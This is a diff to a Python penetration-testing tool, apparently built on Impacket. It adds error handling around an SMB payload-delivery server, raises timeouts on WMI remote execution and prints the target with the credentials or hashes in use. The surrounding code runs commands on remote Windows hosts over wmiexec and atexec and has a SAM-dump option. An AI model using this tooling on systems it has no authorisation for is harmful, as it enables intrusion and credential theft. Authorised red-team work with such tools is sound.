@@ -331,12 +331,16 @@ def http_server(port, working_dir):
 
 def smb_server(working_dir, share_name):
     note = ''
-    smb_srv = smbserver.SimpleSMBServer()
-    smb_srv.addShare(share_name.upper(), working_dir, note)
-    smb_srv.setSMB2Support(False)
-    smb_srv.setSMBChallenge('')
-    smb_srv.setLogFile('')
-    sub_proc = subprocess.Popen([smb_srv.start()])
+    try:
+        smb_srv = smbserver.SimpleSMBServer()
+        smb_srv.addShare(share_name.upper(), working_dir, note)
+        smb_srv.setSMB2Support(False)
+        smb_srv.setSMBChallenge('')
+        smb_srv.setLogFile('')
+        sub_proc = subprocess.Popen([smb_srv.start()])
+    except Exception, e:
+        print("[!] Catapult smb server failed to start")
+    # TODO: ADD IN TEST CASE FOR VERIFYING SMB SERVER STARTED USING pysmb
     return sub_proc
 
 def main():
@@ -695,7 +699,7 @@ Create Pasteable Double Encoded Script:
             if attacks:
                 if srv:
                     srv.terminate()
-                    print("[*] Shutting down the catapult %s server") % (str(delivery))
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
     elif wmiexec_cmd:
         for dst in final_targets:
             if attacks and encoder:
@@ -708,7 +712,7 @@ Create Pasteable Double Encoded Script:
                 #test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 test = True
                 if test:
-                    with Timeout(3):
+                    with Timeout(100):
                         try:
                             srv = delivery_server(src_port, cwd, delivery, share_name)
                             attack = wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
@@ -717,16 +721,21 @@ Create Pasteable Double Encoded Script:
                             print("[!] An error occurred: %s") % (e)
                             if srv:
                                 srv.terminate()
-                                print("[*] Shutting down the catapult %s server") % (str(delivery))
-                                #os.kill(os.getpid(), 9)
+                                print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                                 pass
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-            if attacks and not encoder:
+            elif attacks and not encoder:
+                if hash:
+                    print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+                else:
+                    print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+                if command == "cmd.exe":
+                    sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
                 #test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 test = True
                 if test:
-                    with Timeout(3):
+                    with Timeout(100):
                         try:
                             srv = delivery_server(src_port, cwd, delivery, share_name)
                             attack = wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
@@ -735,8 +744,7 @@ Create Pasteable Double Encoded Script:
                             print("[!] An error occurred: %s") % (e)
                             if srv:
                                 srv.terminate()
-                                print("[*] Shutting down the catapult %s server") % (str(delivery))
-                                #os.kill(os.getpid(), 9)
+                                print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                                 pass
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
@@ -744,7 +752,7 @@ Create Pasteable Double Encoded Script:
                 #test = wmi_test(usr, pwd, dom, dst, hash, aes, kerberos)
                 test = True
                 if test:
-                    with Timeout(3):
+                    with Timeout(100):
                         try:
                             srv = delivery_server(src_port, cwd, delivery, share_name)
                             attack = wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
@@ -753,8 +761,7 @@ Create Pasteable Double Encoded Script:
                             print("[!] An error occurred: %s") % (e)
                             if srv:
                                 srv.terminate()
-                                print("[*] Shutting down the catapult %s server") % (str(delivery))
-                                #os.kill(os.getpid(), 9)
+                                print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                                 pass
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
@@ -782,7 +789,7 @@ Create Pasteable Double Encoded Script:
             if attacks:
                 if srv:
                     srv.terminate()
-                    print("[*] Shutting down the catapult %s server") % (str(delivery))
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
     elif atexec_cmd:
         for dst in final_targets:
             if attacks:
@@ -808,7 +815,7 @@ Create Pasteable Double Encoded Script:
             if attacks:
                 if srv:
                     srv.terminate()
-                    print("[*] Shutting down the catapult %s server") % (delivery)
+                    print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))
     elif sam_dump:
         for dst in final_targets:
             if hash:
